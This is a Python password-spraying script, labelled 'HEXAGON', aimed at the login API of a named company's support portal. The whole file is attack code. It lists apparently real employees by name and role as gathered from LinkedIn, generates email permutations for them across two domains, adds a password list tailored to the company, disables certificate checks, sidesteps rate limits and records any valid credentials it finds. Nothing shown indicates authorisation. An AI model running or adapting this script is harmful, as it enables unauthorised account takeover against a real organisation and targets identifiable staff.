#!/usr/bin/env python3
"""
HEXAGON — Disperso soporte.disperso.com spray
Target: POST https://soporte.disperso.com/api/auth/login
No CAPTCHA, no rate limit confirmado.
"""
import requests, time, json, sys
from datetime import datetime
import urllib3
urllib3.disable_warnings()

TARGET = "https://soporte.disperso.com/api/auth/login"

# ---- EMAILS OSINT (nombres reales de LinkedIn/web) ----
# Patricia Erazo - Gerente General (CEO)
# Sandra Ulloa - Gerente Comercial y Marketing
# Daniela Canales Urrutia - Lead Qualifier
# Monica Rojas Bustos
# Christian Ramirez Pulgar - Analista Soporte/Dev (trabaja en Disperso directamente)
# Jonathan Hernandez - Software Engineer
# Willians Briones Munoz - Developer DevOps
# Esteban Conejeros - Software Architect

osint_emails_disperso = [
    # CEO
    "patricia.erazo@disperso.com",
    "patricia@disperso.com",
    "perazo@disperso.com",
    # Comercial
    "sandra.ulloa@disperso.com",
    "sandra@disperso.com",
    "sulloa@disperso.com",
    # Lead Qualifier
    "daniela.canales@disperso.com",
    "daniela@disperso.com",
    "dcanales@disperso.com",
    # Monica Rojas
    "monica.rojas@disperso.com",
    "monica@disperso.com",
    "mrojas@disperso.com",
    # Christian Ramirez (soporte dev - alta prioridad)
    "christian.ramirez@disperso.com",
    "christian@disperso.com",
    "cramirez@disperso.com",
    # Jonathan Hernandez
    "jonathan.hernandez@disperso.com",
    "jonathan@disperso.com",
    "jhernandez@disperso.com",
    # Willians Briones
    "willians.briones@disperso.com",
    "willians@disperso.com",
    "wbriones@disperso.com",
    # Esteban Conejeros
    "esteban.conejeros@disperso.com",
    "esteban@disperso.com",
    "econejeros@disperso.com",
]

osint_emails_tuxpan = [
    "patricia.erazo@tuxpan.cl",
    "perazo@tuxpan.cl",
    "sandra.ulloa@tuxpan.cl",
    "sulloa@tuxpan.cl",
    "daniela.canales@tuxpan.cl",
    "christian.ramirez@tuxpan.cl",
    "cramirez@tuxpan.cl",
    "jonathan.hernandez@tuxpan.cl",
    "jhernandez@tuxpan.cl",
    "willians.briones@tuxpan.cl",
    "esteban.conejeros@tuxpan.cl",
    "econejeros@tuxpan.cl",
]

# ---- EMAILS GENÉRICOS / FUNCIONALES ----
generic_emails = [
    "admin@disperso.com",
    "soporte@disperso.com",
    "support@disperso.com",
    "help@disperso.com",
    "ops@disperso.com",
    "dev@disperso.com",
    "tech@disperso.com",
    "info@disperso.com",
    "contacto@disperso.com",
    "hola@disperso.com",
    "billing@disperso.com",
    "payments@disperso.com",
    "cto@disperso.com",
    "ceo@disperso.com",
    "sales@disperso.com",
    "noreply@disperso.com",
    "no-reply@disperso.com",
    "hello@disperso.com",
    "operations@disperso.com",
    "finanzas@disperso.com",
    "pagos@disperso.com",
    "api@disperso.com",
    "backend@disperso.com",
    "devops@disperso.com",
    # nombres comunes
    "carlos@disperso.com",
    "pedro@disperso.com",
    "juan@disperso.com",
    "diego@disperso.com",
    "nicolas@disperso.com",
    "francisco@disperso.com",
    "felipe@disperso.com",
    "sebastian@disperso.com",
    "andres@disperso.com",
    "pablo@disperso.com",
    "rodrigo@disperso.com",
    "matias@disperso.com",
    "ignacio@disperso.com",
    "cristian@disperso.com",
    "alejandro@disperso.com",
    "gabriel@disperso.com",
    "daniel@disperso.com",
    "jose@disperso.com",
    "jorge@disperso.com",
    "lucas@disperso.com",
    "martin@disperso.com",
    "tuxpan@disperso.com",
    "admin@tuxpan.cl",
    "soporte@tuxpan.cl",
    "dev@tuxpan.cl",
]

all_emails = osint_emails_disperso + osint_emails_tuxpan + generic_emails

# ---- PASSWORDS (probabilidad decreciente para startup chilena 2024) ----
passwords = [
    # Propias de la empresa
    'Disperso2024!', 'Disperso2025!', 'Disperso2026!',
    'Disperso123!', 'Disperso123', 'disperso123',
    'Tuxpan2024!', 'Tuxpan2025!', 'Tuxpan2026!',
    'Tuxpan123!', 'tuxpan123',
    # Soporte genérico
    'Soporte2024!', 'Soporte2025!', 'Soporte123!', 'soporte123',
    'Support2024!', 'Support123!',
    # Admin genérico
    'Admin2024!', 'Admin2025!', 'Admin1234!', 'Admin123!', 'admin123',
    # Generic
    'Password1!', 'P@ssw0rd', 'P@ssword1', 'Password123!',
    'Qwerty123!', 'Test1234!', 'Demo1234!',
    'Chile2024!', 'Chile2025!',
    'Pagos2024!', 'Spei2024!', 'Spei2025!',
    # muy comunes
    'changeme', 'welcome1', 'Welcome1!', '123456', '12345678',
    'Abc12345!', 'Temporal1!', 'Primer0!',
]

results = {
    "started": datetime.utcnow().isoformat(),
    "target": TARGET,
    "emails_count": len(all_emails),
    "passwords_count": len(passwords),
    "tried": 0,
    "hits": [],
    "interesting": [],
    "errors": 0,
}

HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json, */*",
    "Origin": "https://soporte.disperso.com",
    "Referer": "https://soporte.disperso.com/",
}

DELAY = 0.4  # segundos entre requests

print(f"[*] HEXAGON Spray iniciado: {len(all_emails)} emails x {len(passwords)} passwords")
print(f"[*] Target: {TARGET}")
print(f"[*] Total combos: {len(all_emails) * len(passwords)}")
print("-" * 60)

try:
    for email in all_emails:
        for pwd in passwords:
            try:
                r = requests.post(
                    TARGET,
                    json={"email": email, "password": pwd},
                    headers=HEADERS,
                    timeout=12,
                    verify=False,
                    allow_redirects=True,
                )
                results["tried"] += 1

                if r.status_code == 200:
                    results["hits"].append({
                        "email": email,
                        "password": pwd,
                        "status": r.status_code,
                        "response": r.text[:1000],
                        "ts": datetime.utcnow().isoformat(),
                    })
                    print(f"\n[!!!!] HIT!!! {email}:{pwd} -> {r.status_code}")
                    print(f"       Response: {r.text[:300]}")
                elif r.status_code not in [401, 400, 403, 404, 429]:
                    results["interesting"].append({
                        "email": email,
                        "password": pwd,
                        "status": r.status_code,
                        "response": r.text[:300],
                    })
                    print(f"[?] {email}:{pwd} -> {r.status_code} | {r.text[:80]}")
                elif r.status_code == 429:
                    print(f"[RATE LIMIT] {r.status_code} — esperando 10s")
                    time.sleep(10)
                else:
                    # 401 normal
                    if results["tried"] % 20 == 0:
                        print(f"[.] tried={results['tried']} last={email}")

            except requests.exceptions.ConnectionError as e:
                results["errors"] += 1
                print(f"[ERR-CONN] {email} | {str(e)[:60]}")
                time.sleep(2)
            except Exception as e:
                results["errors"] += 1
                print(f"[ERR] {email}:{pwd} | {str(e)[:60]}")

            time.sleep(DELAY)

except KeyboardInterrupt:
    print("\n[!] Interrumpido por usuario")

results["finished"] = datetime.utcnow().isoformat()
print(f"\n[*] FIN — tried={results['tried']} hits={len(results['hits'])} interesting={len(results['interesting'])} errors={results['errors']}")

with open("/tmp/hexagon_spray_results.json", "w") as f:
    json.dump(results, f, indent=2)
print("[*] Guardado: /tmp/hexagon_spray_results.json")

if results["hits"]:
    print("\n[!!!] CREDENCIALES VÁLIDAS:")
    for h in results["hits"]:
        print(f"  {h['email']}:{h['password']}")
